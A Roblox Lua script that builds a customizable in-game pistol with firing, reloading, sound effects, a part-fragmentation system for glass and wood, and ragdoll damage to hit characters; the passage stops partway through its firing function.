tor,torso,rootpart,rj=ch.Torso,ch.Torso,ch.HumanoidRootPart,ch.HumanoidRootPart.RootJoint
m,mouse=plr:GetMouse(),plr:GetMouse()
cfn,ang,mr,int=CFrame.new,CFrame.Angles,math.rad,Instance.new
bc=BrickColor.new
head=ch.Head
cam=workspace.CurrentCamera

rj.C0=cfn()
rj.C1=cfn()

sheathed=false
jammed=false











local minimumsize = Vector3.new(0.7,0.7,0.7) --Minimumsize for a part to get divided,higher numbers = less detailed and bigger/less bricks
local surface_between_splitted_parts = 'SmoothNoOutlines' --the surface between splitted parts
--local fragmented = workspace:FindFirstChild("Fragmented")
local fragmentable = workspace --all fragmentable objects should be stored in here
local list = {}
local brickcount = 0
--local m = Instance.new("Hint",workspace)
local storage = {}
local fillup = 1000 --it constantly generates new parts until it reaches this number(hacky way to prevent lagspikes if there is a large explosion),change it to 0 if you don愒 want it to generate (useless) parts.
local maximumstorage = 2000 --it will recycle parts if the number of parts in the storage doesnt exceed this number
local storage_position = Vector3.new(0,0,5000) --place them somewhere off the map
local stored_partsize = Vector3.new(1,1,1) --make them small
local parts_created_per_frame = 5 --number of parts being created per frame to fill up the storage


function fragmentate(cframe,size,color,explosion_position,explosion_blastradius,backsurface,bottomsurface,frontsurface,leftsurface,rightsurface,topsurface,transparency,reflectance)
	local xi = size.X >= minimumsize.X*(1+explosion_blastradius/16) and 2 or 1 --to reduce the lagg in large explosions we increase minimumsize based on the explosionradius...
	local yi = size.Y >= minimumsize.Y*(1+explosion_blastradius/16) and 2 or 1
	local zi = size.Z >= minimumsize.Z*(1+explosion_blastradius/16) and 2 or 1
	if xi == 1 and yi == 1 and zi == 1 or (cframe.p-explosion_position).magnitude > size.magnitude/2 + explosion_blastradius then --don愒 fragmentate parts, that are too small to fragmentate or too far away from the explosion
		if xi == 1 and yi == 1 and zi == 1 then return end --optional
		if #storage > 0 then
			local p = storage[1]
			p.BrickColor = color
			p.Size = size
			p.BackSurface = backsurface
			p.BottomSurface = bottomsurface
			p.FrontSurface = frontsurface
			p.LeftSurface = leftsurface
			p.RightSurface = rightsurface
			p.TopSurface = topsurface
			p.Transparency = transparency
			p.CFrame = cframe
			p.Reflectance = reflectance
			table.remove(storage,1)
		else
			local p = Instance.new("Part",fragmentable)
			p.BrickColor = color
			p.FormFactor = "Custom"
			p.Size = size
			p.BackSurface = backsurface
			p.BottomSurface = bottomsurface
			p.FrontSurface = frontsurface
			p.LeftSurface = leftsurface
			p.RightSurface = rightsurface
			p.TopSurface = topsurface
			p.Transparency = transparency
		    if p.Transparency>0.285 then
			    p.Anchored = false
			else
			    p.Anchored=true
			    p.Material='Wood'
			end
			p.CFrame = cframe
			p.Reflectance = reflectance
		end
		--p:MakeJoints()
--		m.Text = m.Text+1
		return --stop the function
	end
	local mody = math.random(-125,125)/1000 --some randomization
	for y = 1,yi do
		if math.random()> 0.5 then
			local modx = math.random(-125,125)/1000
			for x = 1,xi do
				local modz = math.random(-125,125)/1000
				for z = 1,zi do --offset = x/xi-0.75+modx)
					fragmentate(cframe*CFrame.new(size.X*(xi==1 and 0 or x/xi-0.75+modx),size.Y*(yi==1 and 0 or y/yi-0.75+mody),size.Z*(zi==1 and 0 or z/zi-0.75+modz)), --maths
					Vector3.new(xi == 2 and size.X*(1-2*math.abs(x/xi-0.75+modx)) or size.X,yi == 2 and size.Y*(1-2*math.abs(y/yi-0.75+mody)) or size.Y,
					zi == 2 and size.Z*(1-2*math.abs(z/zi-0.75+modz)) or size.Z or agent767_was_here),color,explosion_position,explosion_blastradius,
					z~=zi and surface_between_splitted_parts or backsurface,y==2 and surface_between_splitted_parts or bottomsurface,
					z==2 and surface_between_splitted_parts or frontsurface,x==2 and surface_between_splitted_parts or leftsurface,x~=xi and surface_between_splitted_parts or rightsurface,
					y~=yi and surface_between_splitted_parts or topsurface,transparency,reflectance) 
				end
				
			end
		else
			local modz = math.random(-125,125)/1000
			for z = 1,zi do
				local modx = math.random(-125,125)/1000
				for x = 1,xi do
					fragmentate(cframe*CFrame.new(size.X*(xi==1 and 0 or x/xi-0.75+modx),size.Y*(yi==1 and 0 or y/yi-0.75+mody),size.Z*(zi==1 and 0 or z/zi-0.75+modz)),
					Vector3.new(xi == 2 and size.X*(1-2*math.abs(x/xi-0.75+modx)) or size.X,yi == 2 and size.Y*(1-2*math.abs(y/yi-0.75+mody)) or size.Y,
					zi == 2 and size.Z*(1-2*math.abs(z/zi-0.75+modz)) or size.Z),color,explosion_position,explosion_blastradius,
					z~=zi and surface_between_splitted_parts or backsurface,y==2 and surface_between_splitted_parts or bottomsurface,
					z==2 and surface_between_splitted_parts or frontsurface,x==2 and surface_between_splitted_parts or leftsurface,x~=xi and surface_between_splitted_parts or rightsurface,
					y~=yi and surface_between_splitted_parts or topsurface,transparency,reflectance)
				end
			end
		end
	end				
end

function start_fragmentation(position,radius)
	local search = Region3.new(position-Vector3.new(radius,radius,radius)*1.1,position+Vector3.new(radius,radius,radius)*1.1)
	repeat
	local finish = false
	local parts = workspace:FindPartsInRegion3WithIgnoreList(search,list,100) --maximum number of parts that FindPartsInRegion3 can find is 100, so we have to do this to find them all
	for i = 1,#parts do
		table.insert(list,1,parts[i])
	end
	finish = true
	until #parts < 100 and finish
	print(#list)
	local t = tick()
	for i = 1,#list do
		local p = list[i]
		if p:IsDescendantOf(fragmentable) and p:GetMass()<3000 and p.Transparency>0.285 and p.Name~='Base' and p:IsDescendantOf(ch)==false then
			fragmentate(p.CFrame,p.Size,p.BrickColor,position,radius,p.BackSurface,p.BottomSurface,p.FrontSurface,p.LeftSurface,p.RightSurface,p.TopSurface,p.Transparency,p.Reflectance)
			if #storage < maximumstorage and p.Shape == "Block" then --recycle them
				p.Anchored = false
				p.FormFactor = "Custom"
				p.Size = stored_partsize
				p.Position = storage_position
				table.insert(storage,1,p)
			else --storage is full
				p:Destroy()
			end
--			m.Text = m.Text-1
	    end
		if p:IsDescendantOf(fragmentable) and p:GetMass()<53000 and p.Transparency<0.05 and p.Name~='Base' and tostring(p.Material)=='Enum.Material.Wood' and p:IsDescendantOf(ch)==false then
			fragmentate(p.CFrame,p.Size,p.BrickColor,position,radius,p.BackSurface,p.BottomSurface,p.FrontSurface,p.LeftSurface,p.RightSurface,p.TopSurface,p.Transparency,p.Reflectance)
			if #storage < maximumstorage and p.Shape == "Block" then --recycle them
				p.Anchored = true
				p.Material='Wood'
				p.FormFactor = "Custom"
				p.Size = stored_partsize
				p.Position = storage_position
				table.insert(storage,1,p)
			else --storage is full
				p:Destroy()
			end
--			m.Text = m.Text-1
		end
	end	
	list = {}
--	print(tick()-t)
end

--[[
spawn(function()
    while wait() do --oh noes,a loop! So inefficient!
    	if #storage < fillup then
    		for i = 1, parts_created_per_frame do --creates parts to fill up the storage
    			local p = Instance.new("Part",fragmentable)
    			p.Anchored = false
    			p.FormFactor = "Custom"
    			p.Size = stored_partsize
    			p.Position = storage_position
    			table.insert(storage,1,p)
    		end
    	end
    end
end)
]]























--local blankn=22416261

--172121567

crosshairs={
    {38140824};
    {38140833};
    {38140839};
    {38140843};
    {38140852};
    {38140910};
    {38140915};
    {38140923};
    {38140928};
    {38140931};
    {38208259};
    {38208275};
    {38208284};
    {38208303};
    {38208310};
    {38208325};
    {38208330};
    {38208352};
    {38208359};
    {38208377}
}

bulletholes={
    172274695;
    172274721
}

for _,v in pairs(crosshairs) do
    game:service'ContentProvider':Preload('rbxassetid://' .. tostring(v[1]-1)) 
end

currentIco=2
switchIco=function(num)
    if num<20 then
    else
        num=20
    end
    mouse.Icon='rbxassetid://' .. tostring(crosshairs[num][1]-1)
    currentIco=num
end

switchIco(currentIco)

heldDown=false

spreadint=1
--[[Settings]]--
recoil=false -- Set to true for added realism
magCapacity=20 -- How much a magazine can hold at once
magAmmo=20 -- How much ammo is in the mag
crosshairSpread=5
spread=1
pAmmunition=true -- more damage if true


jamRate=500 -- How often the gun jams(the more the less) (no less than 1)

primaryColor='Really black'
secondaryColor='Really black'

slideReflectance=0.01
slideMaterial='Plastic'

--[[Attachments]]--

silencer=true
highCapMag=false -- High capacity magazine
laser=true
automatic=false
grip=true


getSound=function(id)
    game:service'ContentProvider':Preload('rbxassetid'..tostring(id))
    local s=int("Sound",ch.Head)
    s.SoundId='rbxassetid://' .. tostring(id)
    s.Volume=1
    return s
end

local fireSound=getSound(151997297--[[10209842]])
fireSound.Pitch=1.3
--1.8

local releaseSound=getSound(10209813)
releaseSound.Pitch=4

local reloadSound=getSound(10209636)
reloadSound.Pitch=3

local magazinelockSound=getSound(152206337)
magazinelockSound.Pitch=1.4

local slideBackSound=getSound(152206263)
slideBackSound.Pitch=2.5

local slideForwardSound=getSound(152206302)
slideForwardSound.Pitch=2.5

local emptySound=getSound(2697295)
emptySound.Pitch=5

local glassBreakSound=getSound(144884907)

local woodImpact=getSound(142082171)

local fleshImpact=getSound(144884872)
fleshImpact.Pitch=1.7

if ch:findFirstChild("Tec-99") then
    ch['Tec-99']:Destroy()
end

local tube=int("Model",ch)
tube.Name='Tec-99'
local hopper=Instance.new('HopperBin',plr.Backpack)
hopper.Name=tube.Name
Weld = function(p0,p1,x,y,z,rx,ry,rz,par)--recommend to use this with my weld. use this function only with arm lockers.
    p0.Position = p1.Position
    local w = Instance.new('Motor',par or p0)
    w.Part0 = p1
    w.Part1 = p0
    w.C0 = CFrame.new(x or 0,y or 0,z or 0)*CFrame.Angles(rx or 0,ry or 0,rz or 0)
    w.MaxVelocity = .1
    return w
end
function clerp(c1,c2,sp)
    local R1,R2,R3 = c1:toEulerAnglesXYZ()
    local R21,R22,R23 = c2:toEulerAnglesXYZ()
    return CFrame.new(
    c1.X + (c2.X-c1.X)*sp,
    c1.Y + (c2.Y-c1.Y)*sp,
    c1.Z + (c2.Z-c1.Z)*sp)*CFrame.Angles(
    R1 + (R21-R1)*sp,
    R2 + (R22-R2)*sp,
    R3 + (R23-R3)*sp
    )
end

tweenTable={}
Tween = function(Weld, Stop, Step,a)
ypcall(function()
    local func = function()
        local Start = Weld.C1
        local X1, Y1, Z1 = Start:toEulerAnglesXYZ()
        local Stop = Stop
        local X2, Y2, Z2 = Stop:toEulerAnglesXYZ()
        if not Step then Step=0.1 end
        table.insert(tweenTable,{th=0,Weld=Weld,Step=Step,Start=Start,X1=X1,Y1=Y1,Z1=Z1,Stop=Stop,X2=X2,Y2=Y2,Z2=Z2}) 
    end
        if a then coroutine.wrap(func)() else func() end
end)
end
weld=function(p0,p1,c0)
    local w=Instance.new("Weld",p0)
    w.Part0=p0
    w.Part1=p1
    w.C0=c0
    return w
end
cp=function(parent,color,size,anchored,cancollide)
    local newp=Instance.new("Part",parent)
    newp.TopSurface='SmoothNoOutlines'
    newp.BottomSurface='SmoothNoOutlines'
    newp.FrontSurface='SmoothNoOutlines'
    newp.BackSurface='SmoothNoOutlines'
    newp.RightSurface='SmoothNoOutlines'
    newp.LeftSurface='SmoothNoOutlines'
    newp.FormFactor="Custom"
    newp.BrickColor=bc(color)
    newp.Size=size
    newp.Anchored=anchored
    newp.CanCollide=cancollide
    newp:BreakJoints()
    return newp
end

initializeJoints=function()
    rabr = cp(tube,'White',Vector3.new(1,1,1),false,false) rabr.Transparency = 1 rabr.Name='Locker'
    rabr.Position = torso.Position
    rw = Weld(rabr,torso,1.5,.5,0,0,0,0) rw.Parent = tube rw.Name = 'rw'
    w = Instance.new("Weld",tube)
    w.Part0,w.Part1 = ch['Right Arm'],rabr
    w.C1 = CFrame.new(0,-.5,0)
    labr = cp(tube,'White',Vector3.new(1,1,1),false,false) labr.Transparency = 1 labr.Name='Locker'
    labr.Position = torso.Position
    lw = Weld(labr,torso,-1.5,.5,0,0,0,0) lw.Parent = tube lw.Name = 'lw'
    ww = Instance.new("Weld",tube)
    ww.Part0,ww.Part1 = ch['Left Arm'],labr
    ww.C1 = CFrame.new(0,-.5,0)
end

initializeJoints()

--[[ leg locks
rabl = cp(tube,'White',Vector3.new(1,1,1),false,false) rabl.Transparency = 1 rabl.Name='Locker'
rabl.Position = torso.Position
rwl = Weld(rabl,torso,0.5,-1.5,0,0,0,0) rwl.Parent = tube rwl.Name = 'rwl'
wl = Instance.new("Weld",tube)
wl.Part0,wl.Part1 = ch['Right Leg'],rabl
wl.C1 = CFrame.new(0,-.5,0)
labl = cp(tube,'White',Vector3.new(1,1,1),false,false) labl.Transparency = 1 labl.Name='Locker'
labl.Position = torso.Position
lwl = Weld(labl,torso,-0.5,-1.5,0,0,0,0) lwl.Parent = tube lwl.Name = 'lwl'
wwl = Instance.new("Weld",tube)
wwl.Part0,wwl.Part1 = ch['Left Leg'],labl
wwl.C1 = CFrame.new(0,-.5,0)
]]
--weld(ch['HumanoidRootPart'],torso,cfn())


local counter=Instance.new('ScreenGui',plr.PlayerGui)
local frame=Instance.new('Frame',counter)
frame.Size=UDim2.new(0.25,0,0.3,0)

frame.Position=UDim2.new(0.1,0,0.4,0)
frame.BackgroundTransparency=1

local ammocounter=Instance.new('TextLabel',frame)
ammocounter.Size=UDim2.new(1,0,0.3,0)
ammocounter.Position=UDim2.new(0,0,0.2,0)
ammocounter.BackgroundTransparency=1
ammocounter.TextColor3=BrickColor.new('White').Color
ammocounter.Font='SourceSansBold'
ammocounter.FontSize='Size18'
ammocounter.Text=''
ammocounter.TextXAlignment='Left'


local bg = Instance.new("BodyGyro",rootpart)
bg.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
bg.P = 10000
bg.D = 100


cyl=function(prt)
    local c=int("CylinderMesh",prt)
    return c
end
blo=function(prt)
    local c=int("BlockMesh",prt)
    return c
end

if laser then
    aLaser=cp(tube,'Really red',Vector3.new(0.2,0.2,0.2))
    aLaser.Transparency=1
    cyl(aLaser).Scale=Vector3.new(0.25,1,0.25)
    aLaser.Anchored=true
end

local handle=cp(tube,primaryColor,Vector3.new(0.2,0.6,0.3))
blo(handle).Scale=Vector3.new(1.15,0.9,1)
local mw=weld(ch['Right Arm'],handle,cfn(-0.4,-1,-0.19)*ang(mr(-101.5),0,0)*cfn()*ang(0,mr(-30),mr(-5)))

local framepiece1=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.9))
blo(framepiece1).Scale=Vector3.new(1.15,0.5,1)
weld(handle,framepiece1,cfn(0,0.354,-0.3)*ang(mr(11.5),0,0))

local barrel=cp(tube,'Medium stone grey',Vector3.new(0.2,0.2,0.2))
cyl(barrel).Scale=Vector3.new(0.7,1.2,0.7)
weld(framepiece1,barrel,cfn(0,0.15,-0.1)*ang(mr(-90),0,0))
    
local sbarrel=cp(tube,'Really black',Vector3.new(0.2,0.3,0.2))
cyl(sbarrel).Scale=Vector3.new(0.7,1.5,0.7)
weld(barrel,sbarrel,cfn(0,0.35,0))
local hole=cp(tube,'White',Vector3.new(0.2,0.2,0.2))
hole.Transparency=1
weld(sbarrel,hole,cfn(0,0.2,0))
local flash=int('PointLight',hole)
flash.Enabled=false
flash.Range=10
flash.Color=BrickColor.new('Neon orange').Color

    
local slide1=cp(tube,secondaryColor,Vector3.new(0.2,0.2,0.4))
slide1.CanCollide=false
blo(slide1).Scale=Vector3.new(0.7,1,1.1)
slideweld1=weld(framepiece1,slide1,cfn(0,0.15,0.23))
slide1.Reflectance=slideReflectance
slide1.Material=slideMaterial

local slide2=cp(tube,secondaryColor,Vector3.new(0.2,0.2,0.4))
slide2.CanCollide=false
blo(slide2).Scale=Vector3.new(0.7,1,1.1)
slideweld2=weld(slide1,slide2,cfn(0,0,-0.666))
slide2.Reflectance=slideReflectance
slide2.Material=slideMaterial
    
local slideside1=cp(tube,secondaryColor,Vector3.new(0.2,0.2,1.1))
slideside1.CanCollide=true
blo(slideside1).Scale=Vector3.new(0.25,1,1)
weld(slide1,slideside1,cfn(-0.09,0,-0.335))
slideside1.Reflectance=slideReflectance
slideside1.Material=slideMaterial

local slideside2=cp(tube,secondaryColor, Vector3.new(0.2,0.2,0.4))
slideside2.CanCollide=true
blo(slideside2).Scale=Vector3.new(0.25,1,1.1)
weld(slide1,slideside2,cfn(0.09,0,0))
slideside2.Reflectance=slideReflectance
slideside2.Material=slideMaterial

local slideside3=cp(tube,secondaryColor, Vector3.new(0.2,0.2,0.3))
slideside3.CanCollide=true
blo(slideside3).Scale=Vector3.new(0.25,0.6,0.78)
weld(slideside2,slideside3,cfn(0,-0.04,-0.335))
slideside3.Reflectance=slideReflectance
slideside3.Material=slideMaterial

local slideside4=cp(tube,secondaryColor, Vector3.new(0.2,0.2,0.4))
blo(slideside4).Scale=Vector3.new(0.25,1,1.1)
weld(slide2,slideside4,cfn(0.09,0,0))
slideside4.Reflectance=slideReflectance
slideside4.Material=slideMaterial

local mgs=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.2))
blo(mgs).Scale=Vector3.new(1.15,0.425,0.245)
weld(handle,mgs,cfn(0,-0.3,0.125))

--[[Trigger]]--
local tp1=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.2))
blo(tp1).Scale=Vector3.new(0.6,0.1,0.8)
weld(framepiece1,tp1,cfn(0,-0.22,0.13))

local tp2=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.2))
blo(tp2).Scale=Vector3.new(0.6,0.1,1.19)
weld(framepiece1,tp2,cfn(0,-0.14,-0.0265)*ang(mr(45),0,0))

local trigger1=cp(tube,'Really black',Vector3.new(0.2,0.2,0.2))
blo(trigger1).Scale=Vector3.new(0.3,0.4,0.16)
weld(framepiece1,trigger1,cfn(0,-0.07,0.09))
    
local trigger2=cp(tube,'Really black',Vector3.new(0.2,0.2,0.2))
blo(trigger2).Scale=Vector3.new(0.3,0.3,0.16)
weld(trigger1,trigger2,cfn(0,-0.06,-0.015)*ang(mr(30),0,0))
    
    
--[[Magazine]]--

local magh=cp(tube,'Really black',Vector3.new(0.2,0.5,0.2))
blo(magh).Scale=Vector3.new(0.6,1,1)
local magweld=weld(handle,magh,cfn(0,-0.025,0))
    
local bottom=cp(tube,'Really black',Vector3.new(0.2,0.2,0.3))
blo(bottom).Scale=Vector3.new(1.15,0.385,0.8)
bottomweld=weld(magh,bottom,cfn(0,-0.28,-0.015))
    
if highCapMag then
    magweld:Destroy()    
    magh.Size=Vector3.new(0.2,0.7,0.2)
    magweld=weld(handle,magh,cfn(0,-0.125,0))
    bottomweld:Destroy()
    bottomweld=weld(magh,bottom,cfn(0,-0.38,-0.015))
    magCapacity=magCapacity+23
    magAmmo=magAmmo+23
end
    
--[[Sights]]--
local backsight1=cp(tube,'Black',Vector3.new(0.2,0.2,0.2))
blo(backsight1).Scale=Vector3.new(0.3,0.3,0.3)
weld(slide1,backsight1,cfn(0.06,0.1,0.13))
local backsight2=cp(tube,'Black',Vector3.new(0.2,0.2,0.2))
blo(backsight2).Scale=Vector3.new(0.3,0.3,0.3)
weld(slide1,backsight2,cfn(-0.06,0.1,0.13))

local frontsight=cp(tube,'Black',Vector3.new(0.2,0.2,0.2))
blo(frontsight).Scale=Vector3.new(0.3,0.3,0.3)
weld(slide1,frontsight,cfn(0,0.1,-0.85))
    
local dot1=cp(tube,'Lime green',Vector3.new(0.2,0.2,0.2))
cyl(dot1).Scale=Vector3.new(0.1,0.31,0.1)
weld(backsight1,dot1,cfn(0,0.014,0)*ang(mr(-90),0,0))
    
local dot2=cp(tube,'Lime green',Vector3.new(0.2,0.2,0.2))
cyl(dot2).Scale=Vector3.new(0.1,0.31,0.1)
weld(backsight2,dot2,cfn(0,0.014,0)*ang(mr(-90),0,0))
    
local dot3=cp(tube,'Lime green',Vector3.new(0.2,0.2,0.2))
cyl(dot3).Scale=Vector3.new(0.1,0.31,0.1)
weld(frontsight,dot3,cfn(0,0.014,0)*ang(mr(-90),0,0))

local ba=cp(tube,secondaryColor,Vector3.new(0.2,0.2,0.2))
blo(ba).Scale=Vector3.new(1.15,0.5,1)
weld(framepiece1,ba,cfn(0,0,-0.55))
ba.Reflectance=slideReflectance
ba.Material=slideMaterial

local weirdholethatpistolshave=cp(tube,'Really black', Vector3.new(0.2,0.2,0.2))
cyl(weirdholethatpistolshave).Scale=Vector3.new(0.4,1.01,0.4)
weld(ba,weirdholethatpistolshave,cfn(0,0,0)*ang(mr(-90),0,0))

--[[Tactical Rails]]--

local r1=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.2))
blo(r1).Scale=Vector3.new(1.15,0.2,0.25)
weld(framepiece1,r1,cfn(0,-0.05,-0.17))

local r2=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.2))
blo(r2).Scale=Vector3.new(1.15,0.2,0.25)
weld(framepiece1,r2,cfn(0,-0.05,-0.27))
    
local r3=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.2))
blo(r3).Scale=Vector3.new(1.15,0.2,0.25)
weld(framepiece1,r3,cfn(0,-0.05,-0.37))
    
if laser then
    local base=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.3))
    blo(base).Scale=Vector3.new(1.15,1,1)
    weld(r2,base,cfn(0,-0.05,0))
    basehole=cp(tube,'White',Vector3.new(0.2,0.2,0.2))
    cyl(basehole).Scale=Vector3.new(0.4,0.4,0.4)
    weld(base,basehole,cfn(0,0,-0.13)*ang(mr(-90),0,0))
end

if silencer then
    local sil=cp(tube,'Really black',Vector3.new(0.2,0.3,0.2))
    fireSound.SoundId='rbxassetid://153230595'
    fireSound.Pitch=1
    cyl(sil).Scale=Vector3.new(0.94,1.8,0.94)
    weld(hole,sil,cfn(0,0.29,0))
end

if grip then
    local base=cp(tube,primaryColor,Vector3.new(0.2,0.2,0.3))
    blo(base).Scale=Vector3.new(1.15,1,1)
    weld(r2,base,cfn(0,-0.05,0))
    local hd=cp(tube,primaryColor,Vector3.new(0.2,0.6,0.2))
    cyl(hd)
    weld(base,hd,cfn(0,-0.3,0))
    crosshairSpread=3
    spreadint=spreadint-0.3
end

--[[Test Functions]]--

local debounce=false
local out=false
local bs=false
cockSlide=function() -- hahaha yes i know
    slideBackSound:Play()
    if magAmmo<1 and out==true and bs==false then
        wait()
        slideweld1.C0=slideweld1.C0*cfn(0,0,0.22) 
    else
        for i=1,2 do
            wait()
            slideweld1.C0=slideweld1.C0*cfn(0,0,0.22) 
        end
    end
    local ajar=false
    if magAmmo==1 then
        ajar=true 
    end
    if magAmmo>0 then
        createShell()
        --magAmmo=magAmmo-1
        ammocounter.Text=''
        for i=1,magAmmo do
           ammocounter.Text=ammocounter.Text .. 'I' 
        end
    end
    wait(0.15)
    slideForwardSound:Play()
    for i=1,2 do
        wait()
        slideweld1.C0=slideweld1.C0*cfn(0,0,-0.22) 
    end
    if ajar==true then
        out=true
        slideweld1.C0=cfn(0,0.15,0.23)
        slideweld1.C0=slideweld1.C0*cfn(0,0,0.22) 
    end
end

--fx
local firefx=cp(tube,'Neon orange',Vector3.new(0.7,1.1,0.7))
firefx.Transparency=1
local mesh=Instance.new('SpecialMesh',firefx)
mesh.MeshType='Sphere'
firefx.Material='Neon'
weld(hole,firefx,cfn(0,1,0))

local smokefx=Instance.new('Smoke',hole)
smokefx.Enabled=false
barrel.CanCollide=true




local oc = oc or function(...) return ... end

function ragJoint(hit,r,d)
    Spawn(oc(function()
    d = d or 0
    local rpar,r0,r1 = r.Parent,r.Part0,r.Part1
    if d > 0 then wait(d) end
    local p = hit:Clone()
    p:BreakJoints()
    p:ClearAllChildren()
    p.FormFactor = "Custom"
    p.Size = p.Size/2
    p.Transparency = 1
    p.CanCollide = true
    p.Name = "Colliduh"
    p.Parent = hit
    local w = Instance.new("Weld",p)
    w.Part0 = hit
    w.Part1 = p
    w.C0 = CFrame.new(0,-p.Size.Y/2,0)
    local rot = Instance.new("Rotate",rpar)
    rot.Name = r.Name
    rot.Part0 = r0
    rot.Part1 = r1
    rot.C0 = r.C0
    rot.C1 = r.C1
    r0.Velocity = Vector3.new()
    r1.Velocity = Vector3.new()
    r:Destroy()
    end))
end


createShell=function()
    local shell=cp(tube,'Deep orange',Vector3.new(0.2,0.3,0.2))
    shell.CanCollide=true
    shell.Reflectance=0.3
    cyl(shell)
    shell.CFrame=barrel.CFrame*ang(mr(-90),0,0)
    magAmmo=magAmmo-1
    ammocounter.Text=''
    for i=1,magAmmo do
        ammocounter.Text=ammocounter.Text .. 'I' 
    end
    game.Debris:AddItem(shell,3)
end

reloadPistol=function()
    local current=magAmmo
    Tween(lw,cfn())
    Tween(rw,cfn()*ang(mr(-102),0,0))
    wait(0.4)
    releaseSound:Play()
    bottom.Transparency=1
    magh.Transparency=1
    local mag1=magh:clone()
    mag1.Transparency=0
    mag1.Weld:Destroy''
    local mag2=bottom:clone()
    mag2.Transparency=0
    mag1:BreakJoints''
    mag2:BreakJoints''
    local bm1=mag1:clone()
    local bm2=mag2:clone()
    mag1.Parent=tube
    mag2.Parent=tube
    mag1.CFrame=magh.CFrame
    weld(mag1,mag2,cfn(0,-0.28,-0.015))
    magAmmo=0
    ammocounter.Text=''
    for i=1,magAmmo do
        ammocounter.Text=ammocounter.Text .. 'I' 
    end
    wait()
    mag1.CanCollide=true
    mag2.CanCollide=true
    game.Debris:AddItem(mag1,2)
    game.Debris:AddItem(mag2,2)
    wait(0.1)
    Tween(lw,cfn()*ang(mr(25),0,0))
    bm1.Parent=tube
    bm2.Parent=tube
    weld(bm1,bm2,cfn(0,-0.28,-0.015))
    local fa=weld(ch['Left Arm'],bm1,cfn(0,-1.1,0)*ang(mr(-90),0,0))
    wait(0.1)
    Tween(lw,cfn(0,1.4,0)*ang(mr(-109),mr(60),mr(10)),0.07)
    wait(0.25)
    magazinelockSound:Play()
    wait()
   -- reloadSound:Play()
    fa:Destroy''
    bm1:Destroy''
    bm2:Destroy''
    bottom.Transparency=0
    magh.Transparency=0
    local totalcap=0
    if current<1 then --none in chamber reload
        --slideweld1.C0=cfn(0,0,0.45)
        Tween(rw,cfn(0,0.7,0)*ang(mr(-90),mr(-30),0))
        Tween(lw,cfn(0,0.7,0)*ang(mr(-115),mr(35),0))
        wait(0.1)
        spawn(function()
            cockSlide()
        end)
        Tween(lw,cfn(0,0.7,0)*ang(mr(-115),mr(55),0))
        wait(0.3)
        totalcap=magCapacity
    else
        totalcap=magCapacity+1
    end
    magAmmo=totalcap
    out=false
    ammocounter.Text=''
    for i=1,magAmmo do
        ammocounter.Text=ammocounter.Text .. 'I' 
    end
    restorePosition()
end

firePistol=function()
    switchIco(currentIco+crosshairSpread)
    if not jammed and not out then
        spread=spread+spreadint
    end
    print(spread)
    fireSound.Pitch=math.random(math.random(fireSound.Pitch-0.2,fireSound.Pitch-0.1),math.random(fireSound.Pitch,fireSound.Pitch+0.1))
    if magAmmo>0 and jammed==false then
        local ajar=false
        if magAmmo==1 then
            ajar=true
        end
        user=ch
    	local ray = Ray.new(hole.CFrame.p, ((m.Hit.p+Vector3.new(math.random(-spread,spread)/6.35,math.random(-spread,spread)/6.35,math.random(-spread,spread)/6.35) )- hole.CFrame.p).unit*300)
        local hit, position = game.Workspace:FindPartOnRay(ray, user)
        if hit then
            if hit.Transparency>0.285 and hit:GetMass()<3000 and hit.Parent.className~='Hat' then
                local temps=glassBreakSound:clone()
                temps.Parent=hit
                temps.Pitch=math.random(math.random(temps.Pitch-0.2,temps.Pitch-0.1),math.random(temps.Pitch,temps.Pitch+0.1))
                temps:Play''
                start_fragmentation(position,.25) 
            end
            if tostring(hit.Material)=='Enum.Material.Wood' and hit.Transparency<0.05 then
                local temps=woodImpact:clone()
                temps.Volume=1
                temps.Pitch=math.random(math.random(temps.Pitch-0.2,temps.Pitch-0.1),math.random(temps.Pitch,temps.Pitch+0.1))
                temps.Parent=hit
                temps:Play''
                start_fragmentation(position,.15)
            end
            ypcall(function()
                if hit and hit.Parent and hit.Parent:findFirstChild'Humanoid' then
                    local temps=fleshImpact:clone()
                    temps.Parent=hit
                    temps:Play()
                    if hit.Name~='Head' then
                        if pAmmunition==true then
                	        hit.Parent.Humanoid:TakeDamage(math.random(30,65))
                	    else
                	        hit.Parent.Humanoid:TakeDamage(math.random(10,24))
                	    end
                	    local guy=hit.Parent
                	    if guy.Name~='TheDarkRevenant' then
                            for i,v in pairs(guy:GetChildren()) do
                                if v.className=='Hat' then
                                    v.Handle:BreakJoints()
                                end
                                local r = guy.Torso:FindFirstChild(v.Name:gsub("Arm","Shoulder"):gsub("Leg","Hip"))
                                if v:IsA("BasePart") and r then
                                    ragJoint(v,r,.1)
                                elseif v:IsA("Humanoid") then
                                    spawn(function()
                                        wait(0.5)
                                        v.PlatformStand = true
                                        v.Changed:connect(function()
                                            v.PlatformStand = true
                                        end)
                                    end)
                                end
                            end
                        end
                    
                	else
                	    if hit.Parent.Name~='TheDarkRevenant' then
                	        hit.Parent:BreakJoints() 
                	    end
                	end
                end

            if hit.Parent.className=='Hat' then
                hit.CanCollide=true
                hit:BreakJoints()
                hit.Velocity=m.Hit.p*5
            end
        end)
        end
        if m.Target then
            local p = Instance.new("Part")
            p.formFactor = "Custom"
            p.Size = Vector3.new(0.5,0.5,0.5)
            p.Transparency = 1
            p.CanCollide = false
            p.Locked = true
            p.CFrame = CFrame.new(position.x,position.y,position.z)--mouse.Target.CFrame+(mouse.Hit.p-mouse.Target.Position)
            local w = Instance.new("Weld")
            w.Part0 = mouse.Target
            w.Part1 = p
            w.C0 = mouse.Target.CFrame:inverse()
            w.C1 = p.CFrame:inverse()
            w.Parent = p
            local d = Instance.new("Decal")
            d.Parent = p
            d.Face = mouse.TargetSurface
            d.Texture = 'rbxassetid://' .. tostring(bulletholes[math.random(#bulletholes)]-2)
            p.Parent = tube
            game.Debris:AddItem(p,6)
        end
        if recoil==true then
            cam:SetRoll(math.random(-2,2))
            cam:TiltUnits(0.501)
        end
        local th=cp(tube,"Really black",Vector3.new(1,1,1))
        th.CanCollide=false
        th.Anchored=true
        th.CFrame=CFrame.new(position.x,position.y,position.z)
